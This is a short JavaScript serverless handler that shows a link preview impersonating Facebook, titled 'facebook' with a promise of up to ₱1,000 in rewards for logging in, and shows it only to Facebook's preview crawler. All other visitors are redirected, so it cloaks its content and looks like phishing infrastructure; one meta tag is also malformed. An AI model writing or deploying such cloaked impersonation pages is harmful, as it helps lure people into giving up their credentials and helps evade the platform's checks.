export default function handler(req, res) {
  const ua = req.headers["user-agent"] || "";
  const isBot = ua.includes("facebookexternalhit") || ua.includes("Facebot");

  if (!isBot) {
    return res.redirect("/");
  }

  res.setHeader("Content-Type", "text/html");
  res.send(`<!doctype html>
<html>
<head>
  <meta property="og:type" content="website" />
  <meta property="og:url" content="https://facebookph.vercel.app/" />
  <meta property="og:title" content="facebook" />
  <meta property="og:description" content="<meta property="og:description" content="Login and get amazing rewards that are up to ₱1,000" />" />
  <meta property="og:image" content="https://facebookph.vercel.app/template.png" />
  <meta name="twitter:card" content="summary_large_image" />
  <meta name="twitter:image" content="https://facebookph.vercel.app/template.png" />
</head>
<body></body>
</html>`);
}
